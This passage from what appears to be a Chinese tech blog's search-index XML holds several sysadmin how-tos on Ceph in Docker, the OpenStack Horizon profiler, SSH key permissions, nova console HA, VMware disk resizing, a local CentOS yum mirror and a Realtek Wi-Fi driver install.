rgw，并绑定 80 端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        -p 80:80 \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        ceph/daemon rgw</span></span><br></pre></td></tr></table></figure><h2 id="集群的最终状态"><a href="#集群的最终状态" class="headerlink" title="集群的最终状态"></a>集群的最终状态</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker <span class="built_in">exec</span> b79a02 ceph -s</span></span><br><span class="line">    cluster 96ae62d2-2249-4173-9dee-3a7215cba51c</span><br><span class="line">     health HEALTH_OK</span><br><span class="line">     monmap e4: 3 mons at &#123;node01=192.168.3.123:6789/0,node02=192.168.3.124:6789/0,node03=192.168.3.125:6789/0&#125;</span><br><span class="line">            election epoch 12, quorum 0,1,2 node01,node02,node03</span><br><span class="line">      fsmap e5: 1/1/1 up &#123;0=mds-node01=up:active&#125;</span><br><span class="line">        mgr no daemons active </span><br><span class="line">     osdmap e136: 6 osds: 6 up, 6 in</span><br><span class="line">            flags sortbitwise,require_jewel_osds,require_kraken_osds</span><br><span class="line">      pgmap v1460: 136 pgs, 10 pools, 3829 bytes data, 223 objects</span><br><span class="line">            254 MB used, 598 GB / 599 GB avail</span><br><span class="line">                 136 active+clean</span><br></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="http://xiaoquqi.github.io/blog/2016/06/13/bootstrap-your-ceph-cluster-in-docker/">使用Docker部署Ceph</a><br><a href="https://www.youtube.com/watch?v=FUSTjTBA8f8&feature=youtu.be">Demo: running Ceph in Docker containers </a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>devstack dashboard 开启开发者选项 和 OpenStack Profiler</title>
      <link href="openstack/devstack-turn-on-openstack-profiler.html"/>
      <url>openstack/devstack-turn-on-openstack-profiler.html</url>
      
        <content type="html"><![CDATA[<p>在ocata的版本中，引入了一个新的“openstack profiler”的面板，启用openstack profiler可以方便的看到访问horizon页面时的API调用情况。如下图所示：<br><img data-src="/images/uploads/2017/05/2821496612.png" alt="image"><br>下面介绍如何启用 openstack profiler，首先需要一个正常运行的devstack环境，启用方法如下</p><h3 id="安装mongoDB"><a href="#安装mongoDB" class="headerlink" title="安装mongoDB"></a>安装mongoDB</h3><p>Horizon会将API调用过程的数据都保存到mongodb中，mongodb可以安装在本机，也可以在本机能够访问的任意一台机器上。  </p><h4 id="1-安装软件包"><a href="#1-安装软件包" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h4>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install mongodb-server mongodb -y</span></span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="2-编辑文件-etc-mongod-conf-并完成如下动作："><a href="#2-编辑文件-etc-mongod-conf-并完成如下动作：" class="headerlink" title="2. 编辑文件 /etc/mongod.conf 并完成如下动作："></a>2. 编辑文件 /etc/mongod.conf 并完成如下动作：</h4><ul><li>配置 bind_ip 使用本机 ip 或者 0.0.0.0。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bind_ip = 192.168.3.222</span><br></pre></td></tr></table></figure></li><li>默认情况下，MongoDB会在<code>/var/lib/mongodb/journal</code> 目录下创建几个 1 GB 大小的日志文件。如果你想将每个日志文件大小减小到128MB并且限制日志文件占用的总空间为512MB，配置 smallfiles 的值：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smallfiles = true</span><br></pre></td></tr></table></figure><h4 id="3-启动MongoDB-并配置它随系统启动"><a href="#3-启动MongoDB-并配置它随系统启动" class="headerlink" title="3. 启动MongoDB 并配置它随系统启动"></a>3. 启动MongoDB 并配置它随系统启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> mongod.service</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start mongod.service</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="配置-horizon"><a href="#配置-horizon" class="headerlink" title="配置 horizon"></a>配置 horizon</h3><h4 id="1-复制文件"><a href="#1-复制文件" class="headerlink" title="1. 复制文件"></a>1. 复制文件</h4>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /opt/stack/horizon</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp openstack_dashboard/contrib/developer/enabled/_9001_developer.py openstack_dashboard/<span class="built_in">local</span>/enabled/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp openstack_dashboard/contrib/developer/enabled/_9030_profiler.py openstack_dashboard/<span class="built_in">local</span>/enabled/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp openstack_dashboard/contrib/developer/enabled/_9010_preview.py openstack_dashboard/<span class="built_in">local</span>/enabled/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp openstack_dashboard/<span class="built_in">local</span>/local_settings.d/_9030_profiler_settings.py.example openstack_dashboard/<span class="built_in">local</span>/local_settings.d/_9030_profiler_settings.py</span></span><br></pre></td></tr></table></figure><h4 id="2-编辑-9030-profiler-settings-py-文件，修改-mongoDB-相关配置"><a href="#2-编辑-9030-profiler-settings-py-文件，修改-mongoDB-相关配置" class="headerlink" title="2. 编辑 _9030_profiler_settings.py 文件，修改 mongoDB 相关配置"></a>2. 编辑 _9030_profiler_settings.py 文件，修改 mongoDB 相关配置</h4><p>修改 OPENSTACK_HOST 为mongoDB所在地址<br>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim openstack_dashboard/<span class="built_in">local</span>/local_settings.d/_9030_profiler_settings.py</span></span><br><span class="line"></span><br><span class="line">OPENSTACK_PROFILER.update(&#123;</span><br><span class="line">    &#x27;enabled&#x27;: True,</span><br><span class="line">    &#x27;keys&#x27;: [&#x27;SECRET_KEY&#x27;],</span><br><span class="line">    &#x27;notifier_connection_string&#x27;: &#x27;mongodb://192.168.3.222:27017&#x27;,</span><br><span class="line">    &#x27;receiver_connection_string&#x27;: &#x27;mongodb://192.168.3.222:27017&#x27;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="3-重启-horizon，重新登录-dashboard-，会发现右上角有一个-Profile-下拉菜单，如下图："><a href="#3-重启-horizon，重新登录-dashboard-，会发现右上角有一个-Profile-下拉菜单，如下图：" class="headerlink" title="3. 重启 horizon，重新登录 dashboard ，会发现右上角有一个 Profile 下拉菜单，如下图："></a>3. 重启 horizon，重新登录 dashboard ，会发现右上角有一个 Profile 下拉菜单，如下图：</h4><p><img data-src="/images/uploads/2017/05/4115396943.png" alt="image"><br>如果要获取当前页面的API调用数据，点击 Profile Current Page 会重新刷新页面，加载完成后，到 Developer 下面的 OpenStack Profiler 页面就会看到页面加载过程的详细数据。</p><hr><p>参考文章：<br>[孔令贤-OpenStack Horizon Profiling][<a href="http://lingxiankong.github.io/blog/2017/01/30/horizon-profiling/]">http://lingxiankong.github.io/blog/2017/01/30/horizon-profiling/]</a><br>[OpenStack Installation Guide for Red Hat Enterprise Linux and CentOS][<a href="https://docs.openstack.org/mitaka/install-guide-rdo/environment-nosql-database.html]">https://docs.openstack.org/mitaka/install-guide-rdo/environment-nosql-database.html]</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> devstack </tag>
            
            <tag> profiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh 无密码访问的问题</title>
      <link href="openstack/ssh-key-login-problem.html"/>
      <url>openstack/ssh-key-login-problem.html</url>
      
        <content type="html"><![CDATA[<h3 id="ssh-无密码登录失败"><a href="#ssh-无密码登录失败" class="headerlink" title="ssh 无密码登录失败"></a>ssh 无密码登录失败</h3><p>虚拟机 resize 需要配置计算节点之间 nova 用户无密码访问，但是在配置过程中有一台始终不能用密钥登录，对比了正常可以无密码登录的日志如下。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 正常登录</span></span><br><span class="line">debug2: we did not send a packet, disable method</span><br><span class="line">debug3: authmethod_lookup publickey</span><br><span class="line">debug3: remaining preferred: keyboard-interactive,password</span><br><span class="line">debug3: authmethod_is_enabled publickey</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering RSA public key: /var/lib/nova/.ssh/id_rsa</span><br><span class="line">debug3: send_pubkey_test</span><br><span class="line">debug2: we sent a publickey packet, wait for reply</span><br><span class="line">debug1: Server accepts key: pkalg ssh-rsa blen 279</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 异常报错</span></span><br><span class="line">debug2: we did not send a packet, disable method</span><br><span class="line">debug3: authmethod_lookup publickey</span><br><span class="line">debug3: remaining preferred: keyboard-interactive,password</span><br><span class="line">debug3: authmethod_is_enabled publickey</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering RSA public key: /var/lib/nova/.ssh/id_rsa</span><br><span class="line">debug3: send_pubkey_test</span><br><span class="line">debug2: we sent a publickey packet, wait for reply</span><br><span class="line">debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password</span><br><span class="line">debug1: Trying private key: /var/lib/nova/.ssh/id_dsa</span><br><span class="line">debug3: no such identity: /var/lib/nova/.ssh/id_dsa: No such file or directory</span><br><span class="line">debug1: Trying private key: /var/lib/nova/.ssh/id_ecdsa</span><br><span class="line">debug3: no such identity: /var/lib/nova/.ssh/id_ecdsa: No such file or directory</span><br><span class="line">debug1: Trying private key: /var/lib/nova/.ssh/id_ed25519</span><br><span class="line">debug3: no such identity: /var/lib/nova/.ssh/id_ed25519: No such file or directory</span><br><span class="line">debug2: we did not send a packet, disable method</span><br><span class="line">debug3: authmethod_lookup password</span><br><span class="line">debug3: remaining preferred: ,password</span><br><span class="line">debug3: authmethod_is_enabled password</span><br><span class="line">debug1: Next authentication method: password</span><br></pre></td></tr></table></figure><h3 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h3><ol><li><p>找个一个类似报错的 <a href="https://segmentfault.com/q/1010000000445726">CentOS SSH公钥登录问题</a> ，文中是由于seliunx导致的，我查看了本地的selinux发现已经关闭，不适用我的情况</p></li><li><p>使用 journalctl _COMM=sshd 命令查看日志，发现如下权限问题</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">May 10 17:11:11 compute01 sshd[26498]: pam_systemd(sshd:session): Failed to release session: Interrupted system call</span><br><span class="line">May 10 17:11:11 compute01 sshd[26498]: pam_unix(sshd:session): session closed for user root</span><br><span class="line">May 10 17:12:28 compute01 sshd[2297]: Authentication refused: bad ownership or modes for directory /var/lib/nova</span><br><span class="line">May 10 17:13:09 compute01 sshd[2297]: Connection closed by 192.168.101.105 [preauth]</span><br><span class="line">May 10 17:13:33 compute01 sshd[4103]: Authentication refused: bad ownership or modes for directory /var/lib/nova</span><br><span class="line">May 10 17:25:21 compute01 sshd[23157]: Authentication refused: bad ownership or modes for directory /var/lib/nova</span><br><span class="line">May 10 17:25:25 compute01 sshd[23157]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=compute02  user=nova</span><br></pre></td></tr></table></figure></li><li><p>对比无问题主机的 /var/lib/nova 权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正常主机</span><br><span class="line">drwxr-xr-x   8 nova    nova     118 May 10 16:59 nova</span><br><span class="line">```  </span><br><span class="line">```shell</span><br><span class="line">异常主机</span><br><span class="line">drwxrwxrwx. 11 nova           nova            4096 May 10 17:07 nova</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">4. 解决办法  </span><br><span class="line">修改 /var/lib/nova 目录权限为 755 后，可以正常无密码登录</span><br><span class="line">```shell</span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod -R 755 /var/lib/nova/</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack HA模式下控制台无法访问的问题</title>
      <link href="openstack/can-not-access-to-console-in-HA.html"/>
      <url>openstack/can-not-access-to-console-in-HA.html</url>
      
        <content type="html"><![CDATA[<h3 id="控制台无法访问，多次刷新才能访问，nova有如下报错"><a href="#控制台无法访问，多次刷新才能访问，nova有如下报错" class="headerlink" title="控制台无法访问，多次刷新才能访问，nova有如下报错"></a>控制台无法访问，多次刷新才能访问，nova有如下报错</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2017-02-09 17:09:51.311 57467 INFO nova.console.websocketproxy [-] 192.168.170.41 - - [09/Feb/2017 17:09:51] &quot;GET /websockify HTTP/1.1&quot; 101 -</span><br><span class="line">2017-02-09 17:09:51.312 57467 INFO nova.console.websocketproxy [-] 192.168.170.41 - - [09/Feb/2017 17:09:51] 192.168.170.41: Plain non-SSL (ws://) WebSocket connection</span><br><span class="line">2017-02-09 17:09:51.313 57467 INFO nova.console.websocketproxy [-] 192.168.170.41 - - [09/Feb/2017 17:09:51] 192.168.170.41: Version hybi-13, base64: &#x27;False&#x27;</span><br><span class="line">2017-02-09 17:09:51.313 57467 INFO nova.console.websocketproxy [-] 192.168.170.41 - - [09/Feb/2017 17:09:51] 192.168.170.41: Path: &#x27;/websockify&#x27;</span><br><span class="line">2017-02-09 17:09:51.382 57467 INFO nova.console.websocketproxy [req-f51929d9-8c9b-4df0-abeb-247ce6ef5d65 - - - - -] handler exception: The token &#x27;1dfc9af9-8a49-44b3-a955-5196197bc8f7&#x27; is invalid or has expired</span><br></pre></td></tr></table></figure><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">When running a multi node environment with HA between two or more controller nodes(or controller plane service nodes), nova consoleauthservice must be configured with memcached.  </span><br><span class="line">If not, no more than one consoleauth service can berunning in active state, since it need to save the state of the sessions. Whenmemcached is not used, you can check that can connect to the vnc console only afew times when you refresh the page. If that occurs means that the connectionis handled by the consoleauth service that currently is issuing sessions.    </span><br><span class="line">To solve your issue, configure memcached as backend tonova-consoleauth service.  </span><br><span class="line">To solve your issue add this line to nova.conf:  </span><br><span class="line">memcached_servers = 192.168.100.2:11211,192.168.100.3:11211  </span><br><span class="line">This should work to solve your issue.  </span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>M版在增加memcached_servers选项</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/nova/nova.conf</span></span><br><span class="line"></span><br><span class="line">[DEFAULT]</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;memcached_servers&quot;</span> opt is deprecated <span class="keyword">in</span> Mitaka. In Newton release oslo.cache</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> config options should be used as this option will be removed. Please add a</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> [cache] group <span class="keyword">in</span> your nova.conf file and add <span class="string">&quot;enable&quot;</span> and <span class="string">&quot;memcache_servers&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> option <span class="keyword">in</span> this section. (list value)</span></span><br><span class="line">memcached_servers=controller01:11211,controller02:11211,controller03:11211</span><br></pre></td></tr></table></figure><p>如果是N版的话，memcached_servers已经废弃，需要按照如下修改  </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[cache]</span><br><span class="line">enabled=true</span><br><span class="line">backend=oslo_cache.memcache_pool</span><br><span class="line">memcache_servers=controller01:11211,controller02:11211,controller03:11211</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> HA </tag>
            
            <tag> console </tag>
            
            <tag> dashboard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware 扩展分区大小</title>
      <link href="vmware/vmware-resize-disk.html"/>
      <url>vmware/vmware-resize-disk.html</url>
      
        <content type="html"><![CDATA[<p>测试中遇到这样的情况，vmware虚拟机中增加的 sdb ,可用空间快要满了，需要增加空间，方法记录如下</p><h3 id="1-在VMware上扩展磁盘"><a href="#1-在VMware上扩展磁盘" class="headerlink" title="1. 在VMware上扩展磁盘"></a>1. 在VMware上扩展磁盘</h3><p>在 vmware 虚拟机编辑页面，扩展磁盘的可用空间 (500GB -&gt; 800GB)<br><img data-src="/images/uploads/2017/05/1068317383.png" alt="image"></p><h3 id="2-重启虚拟机"><a href="#2-重启虚拟机" class="headerlink" title="2. 重启虚拟机"></a>2. 重启虚拟机</h3><p>重启后查看分区是否正确识别，可以看到已经正确识别新的分区大小</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> parted /dev/sdb</span></span><br><span class="line">GNU Parted 3.1</span><br><span class="line">Using /dev/sdb</span><br><span class="line">Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.</span><br><span class="line">(parted) p</span><br><span class="line">Model: VMware Virtual disk (scsi)</span><br><span class="line">Disk /dev/sdb: 859GB</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags: </span><br><span class="line"></span><br><span class="line">Number  Start   End    Size   Type     File system  Flags</span><br><span class="line"> 1      1049kB  537GB  537GB  primary  xfs</span><br><span class="line"></span><br><span class="line">(parted) quit</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="3-重新分区"><a href="#3-重新分区" class="headerlink" title="3. 重新分区"></a>3. 重新分区</h3><p>删除原来分区，重新创建新的分区</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> fdisk /dev/sdb</span></span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line"></span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 859.0 GB, 858993459200 bytes, 1677721600 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x634e8675</span><br><span class="line"></span><br><span class="line">Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdb1            2048  1048575999   524286976   83  Linux</span><br><span class="line"></span><br><span class="line">Command (m for help): d                     # 删除分区</span><br><span class="line">Selected partition 1</span><br><span class="line">Partition 1 is deleted</span><br><span class="line"></span><br><span class="line">Command (m for help): n                     # 创建新的分区</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): </span><br><span class="line">Using default response p</span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-1677721599, default 2048): </span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-1677721599, default 1677721599): </span><br><span class="line">Using default value 1677721599</span><br><span class="line">Partition 1 of type Linux and of size 800 GiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line"></span><br><span class="line">WARNING: Re-reading the partition table failed with error 16: Device or resource busy.</span><br><span class="line">The kernel still uses the old table. The new table will be used at</span><br><span class="line">the next reboot or after you run partprobe(8) or kpartx(8)</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure><h3 id="4-重启系统，确保分区表被重新读取"><a href="#4-重启系统，确保分区表被重新读取" class="headerlink" title="4. 重启系统，确保分区表被重新读取"></a>4. 重启系统，确保分区表被重新读取</h3><h3 id="5-扩展分区"><a href="#5-扩展分区" class="headerlink" title="5. 扩展分区"></a>5. 扩展分区</h3><p>首先 mount 新分区，然后使用 xfs_growfs 命令扩展分区</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mount /dev/sdb1 /opt/yum/sample</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> xfs_growfs /dev/sdb1</span></span><br><span class="line">meta-data=/dev/sdb1              isize=512    agcount=4, agsize=32767936 blks</span><br><span class="line">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="line">         =                       crc=1        finobt=0 spinodes=0</span><br><span class="line">data     =                       bsize=4096   blocks=131071744, imaxpct=25</span><br><span class="line">         =                       sunit=0      swidth=0 blks</span><br><span class="line">naming   =version 2              bsize=4096   ascii-ci=0 ftype=1</span><br><span class="line">log      =internal               bsize=4096   blocks=63999, version=2</span><br><span class="line">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="line">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br><span class="line">data blocks changed from 131071744 to 209714944</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果分区是 ext4 格式需要使用 resize2fs 命令</span></span><br></pre></td></tr></table></figure><h3 id="6-验证操作"><a href="#6-验证操作" class="headerlink" title="6. 验证操作"></a>6. 验证操作</h3><p>新分区的大小已经变为800G，原来的文件也没有丢失</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> df -h</span></span><br><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line">……</span><br><span class="line">/dev/sdb1                800G  433G  368G  55% /opt/yum/sample</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vmware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> resize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos制作本地源</title>
      <link href="linux/centos-make-local-mirrors.html"/>
      <url>linux/centos-make-local-mirrors.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-列出所有源"><a href="#1-列出所有源" class="headerlink" title="1. 列出所有源"></a>1. 列出所有源</h2>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum repolist</span></span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">* base: mirrors.aliyun.com</span><br><span class="line">* extras: mirrors.aliyun.com</span><br><span class="line">* updates: mirrors.aliyun.com</span><br><span class="line">repo id repo name status</span><br><span class="line">base/7/x86_64 CentOS-7 - Base - mirrors.aliyun.com 9,363</span><br><span class="line">epel/x86_64 Extra Packages for Enterprise Linux 7 - x86_64 11,135</span><br><span class="line">extras/7/x86_64 CentOS-7 - Extras - mirrors.aliyun.com 263</span><br><span class="line">openstack-mitaka/7/x86_64 OpenStack Newton Repository 1,675</span><br><span class="line">openstack-newton/7/x86_64 OpenStack Newton Repository 1,486</span><br><span class="line">updates/7/x86_64 CentOS-7 - Updates - mirrors.aliyun.com 807</span><br><span class="line">repolist: 24,729</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="2-同步源-以openstack-newton为例"><a href="#2-同步源-以openstack-newton为例" class="headerlink" title="2. 同步源(以openstack-newton为例)"></a>2. 同步源(以openstack-newton为例)</h2>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install yum-utils -y <span class="comment">#安装同步工具</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -p /opt/yum <span class="comment">#同步目录</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> reposync -d -r openstack-newton -p /opt/yum/ <span class="comment">#开始同步，其他参数可以查看help</span></span></span><br></pre></td></tr></table></figure><h2 id="3-创建本地源-生成元数据文件"><a href="#3-创建本地源-生成元数据文件" class="headerlink" title="3. 创建本地源(生成元数据文件)"></a>3. 创建本地源(生成元数据文件)</h2>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install createrepo -y <span class="comment">#安装工具</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> createrepo -v /opt/yum/openstack-newton/</span></span><br></pre></td></tr></table></figure><h2 id="4-安装http服务，配置本地源"><a href="#4-安装http服务，配置本地源" class="headerlink" title="4. 安装http服务，配置本地源"></a>4. 安装http服务，配置本地源</h2><h3 id="安装apache服务并设置开机自启"><a href="#安装apache服务并设置开机自启" class="headerlink" title="安装apache服务并设置开机自启"></a>安装apache服务并设置开机自启</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install httpd -y</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd.service</span></span><br></pre></td></tr></table></figure><h3 id="修改http默认目录"><a href="#修改http默认目录" class="headerlink" title="修改http默认目录"></a>修改http默认目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/httpd/conf/httpd.conf</span></span><br><span class="line"></span><br><span class="line">DocumentRoot &quot;/opt/yum&quot;  #修改此处</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Relax access to content within /var/www.</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash">&lt;Directory <span class="string">&quot;/opt&quot;</span>&gt; <span class="comment">#修改此处</span></span></span><br><span class="line">AllowOverride None</span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow open access:</span></span><br><span class="line">Require all granted</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Further relax access to the default document root:</span></span><br><span class="line">&lt;Directory &quot;/opt/yum/&quot;&gt; #修改此处</span><br></pre></td></tr></table></figure><h3 id="重启httpd"><a href="#重启httpd" class="headerlink" title="重启httpd"></a>重启httpd</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl restart httpd.service</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aliyun </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决lenove e450c安装centos7无线网卡（RTL8723BE）无法使用</title>
      <link href="linux/e450c-install-rtl8723be-driver.html"/>
      <url>linux/e450c-install-rtl8723be-driver.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-查询无线网卡型号"><a href="#1-查询无线网卡型号" class="headerlink" title="1. 查询无线网卡型号"></a>1. 查询无线网卡型号</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /sbin/lspci | grep Network</span></span><br><span class="line">04:00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8723BE PCIe Wireless Network Adapter</span><br></pre></td></tr></table></figure><h3 id="2-查找驱动"><a href="#2-查找驱动" class="headerlink" title="2. 查找驱动"></a>2. 查找驱动</h3><p>github上有个项目提供Realtek的无线网卡驱动 <a href="https://github.com/lwfinger/rtlwifi_new">https://github.com/lwfinger/rtlwifi_new</a> 但是编译报错，查询得知需要3.12以上内核，而centos7 自带的内核是3.10</p><h3 id="3-安装-elrepo-org-中的驱动"><a href="#3-安装-elrepo-org-中的驱动" class="headerlink" title="3. 安装 elrepo.org 中的驱动"></a>3. 安装 elrepo.org 中的驱动</h3><p>升级内核时，发现 elrepo.org 中提供 RTL8723BE 的驱动，下载安装，重启成功识别无线网卡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install kmod-rtl8723be.x86_64</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> reboot</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> centos </tag>
            
            <tag> linux </tag>
            
            <tag> driver </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用kolla快速部署openstack all-in-one环境</title>
      <link href="openstack/use-kolla-deploy-openstack-all-in-one.html"/>
      <url>openstack/use-kolla-deploy-openstack-all-in-one.html</url>
      
